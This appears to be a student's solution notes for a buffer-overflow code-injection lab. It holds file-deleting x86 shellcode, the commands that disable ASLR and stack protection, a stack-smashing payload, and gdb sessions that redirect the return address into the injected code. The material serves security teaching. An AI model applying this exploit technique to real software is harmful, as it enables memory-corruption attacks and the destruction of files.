=================================== Solution ==================
sudo sysctl -w kernel.randomize_va_space=0

gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2

=> update file_del to file_del1 to remove /x00

nasm -g -f elf file_del1.asm 
ld -m elf_i386 -o file_del1 file_del1.o

objdump -d file_del1
=====================================
seed@4cdc6980511c:~/seclabs/codeinjection/delfile$ objdump -d file_del1

file_del1:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 15                   jmp    8048077 <ender>

08048062 <starter>:
 8048062:       31 c0                   xor    %eax,%eax      
 8048064:       b0 05                   mov    $0x5,%al       
 8048066:       04 05                   add    $0x5,%al
 8048068:       bb 7c 80 04 08          mov    $0x804807c,%ebx
 804806d:       cd 80                   int    $0x80

0804806f <_exit>:
 804806f:       31 c0                   xor    %eax,%eax
 8048071:       b0 02                   mov    $0x2,%al
 8048073:       2c 01                   sub    $0x1,%al
 8048075:       cd 80                   int    $0x80

08048077 <ender>:
 8048077:       e8 e6 ff ff ff          call   8048062 <starter>

0804807c <_filename>:
 804807c:       64 75 6d 6d 79 66 69 6c 65                          dummyfile
=====================================
=> address file shell : 804807c => \x7c\x80\x04\x08
Run:
for i in $(objdump -d file_del1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

===============
seed@4cdc6980511c:~/seclabs/codeinjection/delfile$ c^C
seed@4cdc6980511c:~/seclabs/codeinjection/delfile$ for i in $(objdump -d file_del1 |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
\xeb\x15\x31\xc0\xb0\x05\x04\x05\xbb\x7c\x80\x04\x08\xcd\x80\x31\xc0\xb0\x02\x2c\x01\xcd\x80\xe8\xe6\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\xdummyfile
===============
=> string don't have last bytes with dummyfile:
string = \xeb\x15\x31\xc0\xb0\x05\x04\x05\xbb\x7c\x80\x04\x08\xcd\x80\x31\xc0\xb0\x02\x2c\x01\xcd\x80\xe8\xe6\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65

length = 37
68 (buf) - 37 = 31 (space)
+ 4 ebp
+ 4 eip 

r $(python -c "print('\xeb\x15\x31\xc0\xb0\x05\x04\x05\xbb\x7c\x80\x04\x08\xcd\x80\x31\xc0\xb0\x02\x2c\x01\xcd\x80\xe8\xe6\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65'+'A'*31+'\xff\xff\xff\xff')")

gdb vuln.out -q

gdb-peda$ disas main

0x08048441 <+6>:     cmp    DWORD PTR [ebp+0x8],0x1

0x0804846b <+48>:    mov    eax,0x0

b * 0x08048441

b * 0x0804846b
r $(python -c "print('\xeb\x15\x31\xc0\xb0\x05\x04\x05\xbb\x7c\x80\x04\x08\xcd\x80\x31\xc0\xb0\x02\x2c\x01\xcd\x80\xe8\xe6\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65'+'A'*31+'\xff\xff\xff\xff')")

x/80xb $esp
========= before buffer ========
gdb-peda$ x/80xb $esp
0xffffd698:     0x44    0x72    0xfc    0xf7    0xfc    0xe0    0xe2    0xf7
0xffffd6a0:     0x02    0x00    0x00    0x00    0x07    0x00    0x00    0x00
0xffffd6a8:     0x60    0x4a    0xe4    0xf7    0xcb    0x84    0x04    0x08
0xffffd6b0:     0x02    0x00    0x00    0x00    0x74    0xd7    0xff    0xff
0xffffd6b8:     0x80    0xd7    0xff    0xff    0xa1    0x84    0x04    0x08
0xffffd6c0:     0xdc    0x93    0xfc    0xf7    0x0c    0x82    0x04    0x08
0xffffd6c8:     0x89    0x84    0x04    0x08    0x00    0x00    0x00    0x00
0xffffd6d0:     0x00    0x90    0xfc    0xf7    0x00    0x90    0xfc    0xf7
0xffffd6d8:     0x00    0x00    0x00    0x00    0x47    0xe6    0xe2    0xf7
0xffffd6e0:     0x02    0x00    0x00    0x00    0x74    0xd7    0xff    0xff
=============================================
==================== while =================================================
gdb-peda$ x/80xb $esp
0xffffd698:     0xeb    0x15    0x31    0xc0    0xb0    0x05    0x04    0x05
0xffffd6a0:     0xbb    0x7c    0x80    0x04    0x08    0xcd    0x80    0x31
0xffffd6a8:     0xc0    0xb0    0x02    0x2c    0x01    0xcd    0x80    0xe8
0xffffd6b0:     0xe6    0xff    0xff    0xff    0x64    0x75    0x6d    0x6d
0xffffd6b8:     0x79    0x66    0x69    0x6c    0x65    0x41    0x41    0x41
0xffffd6c0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6c8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d8:     0x41    0x41    0x41    0x41    0xff    0xff    0xff    0xff
0xffffd6e0:     0x00    0x00    0x00    0x00    0x74    0xd7    0xff    0xff
============================================================================
address of end shell code : afer 0x65: 0xffffd6b8 + 5
=> gdb-peda$ p 0xffffd6b8+5 
========================
gdb-peda$ p 0xffffd6b8+5
$1 = 0xffffd6bd
========================
Modify the next hex value after shellcode with 0x00
=> set *0xffffd6bd = 0x00
======================== out put ===============
gdb-peda$ set *0xffffd6bd = 0x00
gdb-peda$ x/80xb $esp
0xffffd698:     0xeb    0x15    0x31    0xc0    0xb0    0x05    0x04    0x05
0xffffd6a0:     0xbb    0x7c    0x80    0x04    0x08    0xcd    0x80    0x31
0xffffd6a8:     0xc0    0xb0    0x02    0x2c    0x01    0xcd    0x80    0xe8
0xffffd6b0:     0xe6    0xff    0xff    0xff    0x64    0x75    0x6d    0x6d
0xffffd6b8:     0x79    0x66    0x69    0x6c    0x65    0x00    0x00    0x00
0xffffd6c0:     0x00    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6c8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d8:     0x41    0x41    0x41    0x41    0xff    0xff    0xff    0xff
0xffffd6e0:     0x00    0x00    0x00    0x00    0x74    0xd7    0xff    0xff
===============================================
Find: 804807c => \x7c\x80\x04\x08 address shell code and 
in the line: 0xffffd6a0:     0xbb    0x7c    0x80    0x04    0x08    0xcd    0x80    0x31
start at: 0x7c    0x80    0x04    0x08
=> p 0xffffd6a0+1
=> gdb-peda$ p 0xffffd6a0+1
$2 = 0xffffd6a1
============================
=> And 0804807c <_filename>:
 804807c:       64 75 6d 6d 79 66 69 6c 65                          dummyfile
=> 0x64    0x75    0x6d    0x6d    0x79    0x66    0x69    0x6c    0x65
=> in the line: 0xffffd6b0:     0xe6    0xff    0xff    0xff    0x64    0x75    0x6d    0x6d
=> p 0xffffd6b0+4 = 0xffffd6b4
=======================
==>set *0xffffd6a1 = 0xffffd6b4
====================Out put ==============
gdb-peda$  x/80xb $esp
0xffffd698:     0xeb    0x15    0x31    0xc0    0xb0    0x05    0x04    0x05
0xffffd6a0:     0xbb    0xb4    0xd6    0xff    0xff    0xcd    0x80    0x31
0xffffd6a8:     0xc0    0xb0    0x02    0x2c    0x01    0xcd    0x80    0xe8
0xffffd6b0:     0xe6    0xff    0xff    0xff    0x64    0x75    0x6d    0x6d
0xffffd6b8:     0x79    0x66    0x69    0x6c    0x65    0x00    0x00    0x00
0xffffd6c0:     0x00    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6c8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d8:     0x41    0x41    0x41    0x41    0xff    0xff    0xff    0xff
0xffffd6e0:     0x00    0x00    0x00    0x00    0x74    0xd7    0xff    0xff
==========================================
we can see in line: 0xffffd6b0:     0xe6    0xff    0xff    0xff    0x64    0x75    0x6d    0x6d
0xffffd6b8:     0x79    0x66    0x69    0x6c    0x65 
=========
=> Set return address with start $esp
0xffffd6d8:     0x41    0x41    0x41    0x41    0xff    0xff    0xff    0xff
=> return = 0xffffd6d8+4
=> p 0xffffd6d8+4
=> gdb-peda$ p 0xffffd6d8+4
$3 = 0xffffd6dc
=>set *0xffffd6dc=$esp
==================== out put ================
gdb-peda$ set *0xffffd6dc=$esp
gdb-peda$ x/80xb $esp
0xffffd698:     0xeb    0x15    0x31    0xc0    0xb0    0x05    0x04    0x05
0xffffd6a0:     0xbb    0xb4    0xd6    0xff    0xff    0xcd    0x80    0x31
0xffffd6a8:     0xc0    0xb0    0x02    0x2c    0x01    0xcd    0x80    0xe8
0xffffd6b0:     0xe6    0xff    0xff    0xff    0x64    0x75    0x6d    0x6d
0xffffd6b8:     0x79    0x66    0x69    0x6c    0x65    0x00    0x00    0x00
0xffffd6c0:     0x00    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6c8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xffffd6d8:     0x41    0x41    0x41    0x41    0x98    0xd6    0xff    0xff
0xffffd6e0:     0x00    0x00    0x00    0x00    0x74    0xd7    0xff    0xff

